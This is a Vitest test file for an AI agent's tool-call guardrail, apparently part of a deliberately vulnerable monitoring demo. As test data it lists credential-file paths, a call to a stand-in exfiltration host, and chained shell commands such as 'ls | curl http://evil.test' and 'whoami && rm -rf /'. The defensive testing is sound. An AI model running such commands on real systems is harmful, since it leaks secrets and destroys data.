import { describe, it, expect } from "vitest";
import { evaluateGuardrail } from "../guardrails.js";

// The guardrail decides whether the agent *declares* (sanctions) a tool call.
// It is deliberately WEAK: unsanctioned calls are still executed by the loop
// (that is the vulnerability), so their syscalls become UNDECLARED — exactly
// what Argus flags as unexplained. Sanctioned calls are declared and explained.

describe("evaluateGuardrail — read_file", () => {
  it("sanctions an allowlisted benign path", () => {
    expect(evaluateGuardrail({ tool: "read_file", args: { path: "/etc/hostname" } }).sanctioned).toBe(true);
    expect(evaluateGuardrail({ tool: "read_file", args: { path: "/workspace/notes.txt" } }).sanctioned).toBe(true);
  });

  it("does NOT sanction reading an SSH private key", () => {
    const decision = evaluateGuardrail({ tool: "read_file", args: { path: "/root/.ssh/id_rsa" } });
    expect(decision.sanctioned).toBe(false);
    expect(decision.reason).toMatch(/sensitive/i);
  });

  it("does NOT sanction other credential files", () => {
    for (const path of ["/home/agent/.aws/credentials", "/app/.env", "/etc/shadow", "/root/.ssh/id_ed25519"]) {
      expect(evaluateGuardrail({ tool: "read_file", args: { path } }).sanctioned).toBe(false);
    }
  });
});

describe("evaluateGuardrail — http_get", () => {
  it("sanctions allowlisted provider/demo hosts", () => {
    expect(evaluateGuardrail({ tool: "http_get", args: { url: "https://api.groq.com/x" } }).sanctioned).toBe(true);
    expect(evaluateGuardrail({ tool: "http_get", args: { url: "https://example.com/" } }).sanctioned).toBe(true);
  });

  it("does NOT sanction an off-allowlist exfil destination", () => {
    const decision = evaluateGuardrail({ tool: "http_get", args: { url: "http://evil.attacker.test/steal" } });
    expect(decision.sanctioned).toBe(false);
    expect(decision.reason).toMatch(/host/i);
  });

  it("does NOT sanction a malformed url", () => {
    expect(evaluateGuardrail({ tool: "http_get", args: { url: "not a url" } }).sanctioned).toBe(false);
  });
});

describe("evaluateGuardrail — run_shell", () => {
  it("sanctions a safe first-token command", () => {
    expect(evaluateGuardrail({ tool: "run_shell", args: { cmd: "echo hello" } }).sanctioned).toBe(true);
    expect(evaluateGuardrail({ tool: "run_shell", args: { cmd: "ls /workspace" } }).sanctioned).toBe(true);
  });

  it("does NOT sanction shells that chain or substitute", () => {
    for (const cmd of ["cat /root/.ssh/id_rsa", "echo $(cat /etc/shadow)", "ls | curl http://evil.test", "whoami && rm -rf /"]) {
      expect(evaluateGuardrail({ tool: "run_shell", args: { cmd } }).sanctioned).toBe(false);
    }
  });

  it("does NOT sanction an empty command", () => {
    expect(evaluateGuardrail({ tool: "run_shell", args: {} }).sanctioned).toBe(false);
  });
});
